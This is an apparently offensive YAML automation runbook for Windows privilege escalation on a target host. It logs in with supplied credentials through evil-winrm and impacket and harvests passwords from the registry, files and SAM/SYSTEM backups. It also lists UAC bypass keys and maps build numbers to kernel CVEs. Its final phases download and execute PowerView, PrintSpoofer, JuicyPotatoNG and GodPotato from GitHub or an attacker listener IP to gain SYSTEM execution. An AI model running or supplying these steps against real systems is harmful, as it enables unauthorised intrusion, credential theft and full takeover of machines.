# v2 runbook — Windows privilege escalation enumeration & exploitation
name: "Windows Privilege Escalation"
description: "Enumerate Windows systems for privilege escalation vectors: kernel exploits, service misconfigurations, token manipulation, UAC bypass, AlwaysInstallElevated, registry, credentials"
version: "2.0"

vars:
  target_host: ""
  target_user: ""
  target_pass: ""
  target_hash: ""
  listener_ip: ""
  listener_port: 443

steps:
  - id: preamble
    type: log
    message: "Windows privesc — {target_host} (case: {case_id})"

  # Phase 1: Initial access via WinRM / SMB
  - id: access
    name: "Establish access"
    type: parallel
    max_workers: 4
    steps:
      - id: evil_winrm
        name: "WinRM shell"
        tool: evil-winrm
        args: ["-i", "{target_host}",
               "-u", "{target_user}",
               "-p", "{target_pass}"]
        timeout: 30
        save: "{case_dir}/winrm_session.log"

      - id: wmic_conn
        name: "WMIC remote connection"
        tool: impacket-wmiexec
        args: ["{target_user}:{target_pass}@{target_host}"]
        timeout: 30
        save: "{case_dir}/wmic_check.txt"

      - id: psexec_check
        name: "PsExec access check"
        tool: impacket-psexec
        args: ["{target_user}:{target_pass}@{target_host}",
               "whoami"]
        timeout: 30
        save: "{case_dir}/psexec_check.txt"

  # Phase 2: System information
  - id: system_info
    name: "System information enumeration"
    type: parallel
    max_workers: 6
    steps:
      - id: sysinfo
        name: "System info"
        tool: powershell
        args: ["-Command",
               "Get-CimInstance Win32_OperatingSystem | Select Caption,Version,BuildNumber,OSArchitecture; Get-CimInstance Win32_ComputerSystem | Select Manufacturer,Model,TotalPhysicalMemory; Get-CimInstance Win32_Processor | Select Name,NumberOfCores"]
        timeout: 30
        save: "{case_dir}/system_info.txt"

      - id: hotfixes
        name: "Installed hotfixes"
        tool: powershell
        args: ["-Command",
               "Get-HotFix | Select HotFixID,InstalledOn,Description"]
        timeout: 30
        save: "{case_dir}/hotfixes.txt"

      - id: pathtouse
        name: "Watson / Sherlock check"
        tool: powershell
        args: ["-Command",
               "$patches=@(); Get-HotFix | ForEach-Object {$patches+=$_.HotFixID}; Write-Output $patches"]
        timeout: 30
        save: "{case_dir}/installed_patches.txt"

  # Phase 3: Service abuse
  - id: services
    name: "Service enumeration"
    type: parallel
    max_workers: 6
    steps:
      - id: svc_perm
        name: "Weak service permissions"
        tool: powershell
        args: ["-Command",
               "Get-CimInstance Win32_Service | Where-Object {$_.StartName -eq 'LocalSystem'} | Select Name,DisplayName,PathName,State,StartMode"]
        timeout: 30
        save: "{case_dir}/services_system.txt"

      - id: svc_path
        name: "Unquoted service paths"
        tool: powershell
        args: ["-Command",
               "Get-CimInstance Win32_Service | Where-Object {$_.PathName -match '^[^\"].* .*[^\"].exe'} | Select Name,PathName"]
        timeout: 30
        save: "{case_dir}/unquoted_services.txt"

      - id: svc_writable
        name: "Writable service binaries"
        tool: powershell
        args: ["-Command",
               "Get-CimInstance Win32_Service | ForEach-Object {$p=$_.PathName -replace '\"',''; if(Test-Path $p) { $a=Get-Acl $p -ErrorAction SilentlyContinue; if($a -and ($a.Access|Where-Object {$_.FileSystemRights -match 'Write|Modify|FullControl' -and $_.IdentityReference -match 'BUILTIN\\\\Users|Everyone'})) {[PSCustomObject]@{Name=$_.Name;Path=$p}}} }"]
        timeout: 60
        save: "{case_dir}/writable_service_bins.txt"

      - id: svc_mod
        name: "Modifiable services (sc config)"
        tool: powershell
        args: ["-Command",
               "Get-CimInstance Win32_Service | Where-Object {$_.PathName -match '^(?!.*system32).*' -and $_.State -eq 'Stopped'} | Select Name,PathName,StartMode"]
        timeout: 30
        save: "{case_dir}/modifiable_services.txt"

  # Phase 4: Token & privilege abuse
  - id: tokens
    name: "Token & privilege checks"
    type: parallel
    max_workers: 5
    steps:
      - id: whoami_priv
        name: "Current privileges"
        tool: powershell
        args: ["-Command", "whoami /priv"]
        timeout: 15
        save: "{case_dir}/whoami_priv.txt"

      - id: token_seimpersonate
        name: "SeImpersonate / SeAssignToken check"
        tool: powershell
        args: ["-Command",
               "whoami /priv | Select-String -Pattern 'SeImpersonatePrivilege|SeAssignPrimaryTokenPrivilege|SeTcbPrivilege|SeBackupPrivilege|SeRestorePrivilege|SeTakeOwnershipPrivilege|SeLoadDriverPrivilege|SeDebugPrivilege'"]
        timeout: 15
        save: "{case_dir}/juicy_privs.txt"

      - id: token_juicy
        name: "JuicyPotato / PrintSpoofer check"
        tool: python3
        args: ["-c",
               "import sys\nprivs=open('{case_dir}/juicy_privs.txt').read()\nif 'SeImpersonate' in privs:\n print('VULNERABLE: SeImpersonate -> JuicyPotato/RoguePotato/PrintSpoofer/GodPotato')\nif 'SeAssignPrimary' in privs:\n print('VULNERABLE: SeAssignPrimaryToken -> JuicyPotato')\nif 'SeBackup' in privs:\n print('VULNERABLE: SeBackupPrivilege -> backup SAM/SYSTEM')\nif 'SeRestore' in privs:\n print('VULNERABLE: SeRestorePrivilege -> write arbitrary files')\nif 'SeTakeOwnership' in privs:\n print('VULNERABLE: SeTakeOwnership -> take ownership of files')\nif 'SeDebug' in privs:\n print('VULNERABLE: SeDebugPrivilege -> process injection')\nif 'SeLoadDriver' in privs:\n print('VULNERABLE: SeLoadDriverPrivilege -> capcom.sys')\nif 'SeTcb' in privs:\n print('VULNERABLE: SeTcbPrivilege -> ActAsPartOfTheOperatingSystem')"]
        timeout: 15
        save: "{case_dir}/token_exploit_check.txt"

  # Phase 5: UAC bypass
  - id: uac
    name: "UAC bypass"
    type: sequential
    steps:
      - id: uac_check
        name: "Check UAC level"
        tool: powershell
        args: ["-Command",
               "(Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System).EnableLUA; (Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System).ConsentPromptBehaviorAdmin"]
        timeout: 15
        save: "{case_dir}/uac_status.txt"

      - id: uac_bypass
        name: "UAC bypass techniques"
        tool: python3
        args: ["-c",
               "import sys\nuac=open('{case_dir}/uac_status.txt').read().strip()\nlines=uac.split('\\n')\nlua=lines[0].strip() if lines else '0'\nconsent=lines[1].strip() if len(lines)>1 else '0'\nif lua=='0':\n print('UAC DISABLED - run as admin directly')\nelif consent=='0':\n print('UAC: Auto-elevate (ConsentPrompt=0) - use fodhelper.exe, eventvwr.exe bypass')\nelse:\n print('UAC: Default (ConsentPrompt=2) - cmstp.exe, wmic.exe, slui.exe bypass')\nprint()\nprint('Common bypasses:')\nprint('  fodhelper.exe: HKCU\\\\Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command')\nprint('  eventvwr.exe: HKCU\\\\Software\\\\Classes\\\\mscfile\\\\shell\\\\open\\\\command')\nprint('  computerdefaults.exe: HKCU\\\\Software\\\\Classes\\\\ms-settings\\\\Shell\\\\Open\\\\command')\nprint('  sdclt.exe: HKCU\\\\Software\\\\Classes\\\\exefile\\\\shell\\\\runas\\\\command')\nprint('  diskcleanup.exe: silentcleanup')\nprint('  CMSTPLUA: UAC bypass via cmstp.exe')"]
        timeout: 15
        save: "{case_dir}/uac_bypass_guide.txt"

  # Phase 6: AlwaysInstallElevated & registry
  - id: registry
    name: "Registry checks"
    type: parallel
    max_workers: 4
    steps:
      - id: reg_always_install
        name: "AlwaysInstallElevated"
        tool: powershell
        args: ["-Command",
               "Get-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer 2>$null | Select AlwaysInstallElevated; Get-ItemProperty HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer 2>$null | Select AlwaysInstallElevated"]
        timeout: 15
        save: "{case_dir}/always_install_elevated.txt"

      - id: reg_autoruns
        name: "Autorun entries"
        tool: powershell
        args: ["-Command",
               "Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run; Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce; Get-ItemProperty HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run; Get-ItemProperty HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"]
        timeout: 15
        save: "{case_dir}/autoruns.txt"

      - id: reg_sched
        name: "Scheduled tasks"
        tool: powershell
        args: ["-Command",
               "Get-ScheduledTask | Where-Object {$_.TaskPath -notmatch 'Microsoft'} | Select TaskName,TaskPath,State,Actions"]
        timeout: 30
        save: "{case_dir}/scheduled_tasks.txt"

  # Phase 7: Credential hunting
  - id: credentials
    name: "Credential harvesting"
    type: parallel
    max_workers: 5
    steps:
      - id: cred_registry
        name: "Registry passwords"
        tool: powershell
        args: ["-Command",
               "reg query HKLM /f password /t REG_SZ /s 2>$null; reg query HKCU /f password /t REG_SZ /s 2>$null"]
        timeout: 60
        save: "{case_dir}/registry_passwords.txt"

      - id: cred_files
        name: "Interesting files"
        tool: powershell
        args: ["-Command",
               "Get-ChildItem -Path C:\\ -Recurse -Force -ErrorAction SilentlyContinue -Include '*password*','*credential*','*secret*','*vnc*','*.kdbx','*.rdp' | Select FullName,Length,LastWriteTime"]
        timeout: 120
        save: "{case_dir}/interesting_files.txt"

      - id: cred_unattend
        name: "Unattended install files"
        tool: powershell
        args: ["-Command",
               "Get-ChildItem -Path C:\\ -Recurse -Force -ErrorAction SilentlyContinue -Include 'unattend.xml','unattended.xml','autounattend.xml','sysprep.inf','sysprep.xml' | Select FullName"]
        timeout: 60
        save: "{case_dir}/unattend_files.txt"

      - id: cred_sam
        name: "SAM/SYSTEM backup check"
        tool: powershell
        args: ["-Command",
               "Test-Path C:\\Windows\\Repair\\SAM; Test-Path C:\\Windows\\Repair\\SYSTEM; Test-Path C:\\Windows\\System32\\config\\SAM; Test-Path C:\\Windows\\System32\\config\\SYSTEM; Get-ChildItem C:\\Windows\\System32\\config\\RegBack -ErrorAction SilentlyContinue"]
        timeout: 15
        save: "{case_dir}/sam_check.txt"

  # Phase 8: Kernel exploit suggestions
  - id: kernel
    name: "Kernel exploit detection"
    type: parallel
    steps:
      - id: kern_build
        name: "Get build number"
        tool: powershell
        args: ["-Command",
               "(Get-CimInstance Win32_OperatingSystem).BuildNumber"]
        timeout: 15
        save: "{case_dir}/build_number.txt"

      - id: kern_suggest
        name: "Kernel exploit mapping"
        tool: python3
        args:
          - "-c"
          - |-
            import sys
            build = open('{case_dir}/build_number.txt').read().strip()
            exploits = {
             '7601': ['MS10-015 (Kitrap0d)', 'MS11-011 (Afrodita)', 'MS15-051 (win32k)', 'MS16-032 (Secondary Logon)', 'MS16-135 (win32k)'],
             '9200': ['MS13-005 (hnd)', 'MS14-002 (ndproxy)', 'MS15-051', 'MS16-032'],
             '9600': ['MS15-051', 'MS16-032', 'MS16-135', 'CVE-2018-8120', 'CVE-2019-0808'],
             '10240': ['CVE-2015-6100', 'CVE-2020-0796 (SMBGhost)', 'CVE-2021-1732', 'CVE-2021-40449'],
             '10586': ['CVE-2016-0099', 'CVE-2020-0796', 'CVE-2021-1732'],
             '14393': ['CVE-2016-7225', 'CVE-2017-0101', 'CVE-2020-0796', 'CVE-2021-1732', 'CVE-2021-40449', 'CVE-2022-21882'],
             '15063': ['CVE-2017-0101', 'CVE-2017-0213', 'CVE-2020-0796', 'CVE-2021-1732', 'CVE-2022-21882'],
             '16299': ['CVE-2018-8120', 'CVE-2018-8897', 'CVE-2020-0796', 'CVE-2021-1732', 'CVE-2021-40449', 'CVE-2022-21882'],
             '17134': ['CVE-2018-8120', 'CVE-2018-8897', 'CVE-2020-0796', 'CVE-2021-1732', 'CVE-2021-40449', 'CVE-2022-21882'],
             '17763': ['CVE-2019-0808', 'CVE-2020-0796', 'CVE-2021-1732', 'CVE-2021-40449', 'CVE-2022-21882', 'CVE-2023-21768'],
             '18362': ['CVE-2020-0796', 'CVE-2021-1732', 'CVE-2021-40449', 'CVE-2022-21882', 'CVE-2023-21768'],
             '18363': ['CVE-2020-0796', 'CVE-2021-1732', 'CVE-2021-40449', 'CVE-2022-21882', 'CVE-2023-21768'],
             '19041': ['CVE-2021-1732', 'CVE-2021-40449', 'CVE-2022-21882', 'CVE-2023-21768', 'CVE-2024-26234'],
             '19042': ['CVE-2021-40449', 'CVE-2022-21882', 'CVE-2023-21768', 'CVE-2024-26234'],
             '19043': ['CVE-2021-40449', 'CVE-2022-21882', 'CVE-2023-21768', 'CVE-2024-26234'],
             '19044': ['CVE-2021-40449', 'CVE-2022-21882', 'CVE-2023-21768', 'CVE-2024-26234'],
             '19045': ['CVE-2022-21882', 'CVE-2023-21768', 'CVE-2024-26234'],
             '20348': ['CVE-2022-21882', 'CVE-2023-21768', 'CVE-2024-26234'],
             '22000': ['CVE-2022-21882', 'CVE-2023-21768', 'CVE-2024-26234', 'CVE-2024-30088'],
             '22621': ['CVE-2023-21768', 'CVE-2024-26234', 'CVE-2024-30088'],
             '22631': ['CVE-2023-21768', 'CVE-2024-26234', 'CVE-2024-30088'],
            }
            if build in exploits:
                print(f'Build {build} - Suggested kernel exploits:')
                for e in exploits[build]:
                    print(f'  - {e}')
            else:
                print(f'Build {build} - No specific mapping; search for exploits matching this build')
        timeout: 15
        save: "{case_dir}/kernel_exploit_suggestions.txt"
        save: "{case_dir}/kernel_exploit_suggestions.txt"

  # Phase 9: Automated enumeration
  - id: auto_enum
    name: "Automated enumeration scripts"
    type: parallel
    steps:
      - id: winpeas
        name: "WinPEAS"
        tool: powershell
        args: ["-Command",
               "Invoke-WebRequest -Uri 'https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe' -OutFile '{case_dir}/winpeas.exe'; Start-Process -NoNewWindow -Wait '{case_dir}/winpeas.exe' -ArgumentList 'log,{case_dir}/winpeas.txt'",
               "-o", "{case_dir}/winpeas_run.txt"]
        timeout: 120
        artifacts: ["{case_dir}/winpeas.txt"]

      - id: powerview
        name: "PowerView privesc check"
        tool: powershell
        args: ["-Command",
               "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1'); Find-LocalAdminAccess; Get-NetLocalGroup; Invoke-CheckLocalAdminAccess",
               "-o", "{case_dir}/powerview_privesc.txt"]
        timeout: 60

  # Phase 10: Active exploitation
  - id: ask_exploit
    type: prompt
    message: "Attempt Windows privesc exploitation? (requires binary payloads)"
    then:
      - id: exploit_printspoofer
        name: "PrintSpoofer"
        tool: powershell
        args: ["-Command",
               "Invoke-WebRequest -Uri 'http://{listener_ip}/PrintSpoofer64.exe' -OutFile '{case_dir}/PrintSpoofer64.exe'; Start-Process '{case_dir}/PrintSpoofer64.exe' -ArgumentList '-i -c powershell'",
               "-o", "{case_dir}/printspoofer_exploit.txt"]
        timeout: 60
        when: "has:SeImpersonate"

      - id: exploit_hotpotato
        name: "JuicyPotatoNG"
        tool: powershell
        args: ["-Command",
               "Invoke-WebRequest -Uri 'http://{listener_ip}/JuicyPotatoNG.exe' -OutFile '{case_dir}/JuicyPotatoNG.exe'; Start-Process '{case_dir}/JuicyPotatoNG.exe' -ArgumentList '-t * -p C:\\Windows\\System32\\cmd.exe -a \\\"/c whoami\\\"'",
               "-o", "{case_dir}/juicypotato_exploit.txt"]
        timeout: 60

      - id: exploit_godpotato
        name: "GodPotato"
        tool: powershell
        args: ["-Command",
               "Invoke-WebRequest -Uri 'http://{listener_ip}/GodPotato-NET4.exe' -OutFile '{case_dir}/GodPotato.exe'; Start-Process '{case_dir}/GodPotato.exe' -ArgumentList '-cmd cmd -args \\\"/c whoami > {case_dir}/godpotato_out.txt\\\"'",
               "-o", "{case_dir}/godpotato_exploit.txt"]
        timeout: 60

  # Phase 11: Report
  - id: report
    name: "Generate Windows privesc report"
    type: report
    format: markdown
    title: "Windows Privilege Escalation — {target_host}"
    output: "{case_dir}/windows-privesc-report.md"
    sections:
      - heading: "Target"
        body: "- Host: {target_host}\n- User: {target_user}\n- Case: {case_id}"
      - heading: "System"
        body: "- OS: {case_dir}/system_info.txt\n- Patches: {case_dir}/hotfixes.txt\n- Build: {case_dir}/build_number.txt"
      - heading: "Services"
        body: "- Weak permissions: {case_dir}/services_system.txt\n- Unquoted paths: {case_dir}/unquoted_services.txt\n- Writable bins: {case_dir}/writable_service_bins.txt"
      - heading: "Privileges"
        body: "- Current: {case_dir}/whoami_priv.txt\n- Exploitable: {case_dir}/juicy_privs.txt\n- Token exploits: {case_dir}/token_exploit_check.txt"
      - heading: "UAC"
        body: "- Status: {case_dir}/uac_status.txt\n- Bypass guide: {case_dir}/uac_bypass_guide.txt"
      - heading: "Registry"
        body: "- AlwaysInstallElevated: {case_dir}/always_install_elevated.txt\n- Autoruns: {case_dir}/autoruns.txt\n- Schedules: {case_dir}/scheduled_tasks.txt"
      - heading: "Credentials"
        body: "- Registry passwords: {case_dir}/registry_passwords.txt\n- Interesting files: {case_dir}/interesting_files.txt\n- SAM check: {case_dir}/sam_check.txt"
      - heading: "Kernel"
        body: "- Suggested exploits: {case_dir}/kernel_exploit_suggestions.txt"
      - heading: "Automated"
        body: "- WinPEAS: {case_dir}/winpeas.txt\n- PowerView: {case_dir}/powerview_privesc.txt"

postflight:
  - id: done
    type: notify
    level: success
    message: "Windows privesc enumeration complete — {case_dir}"
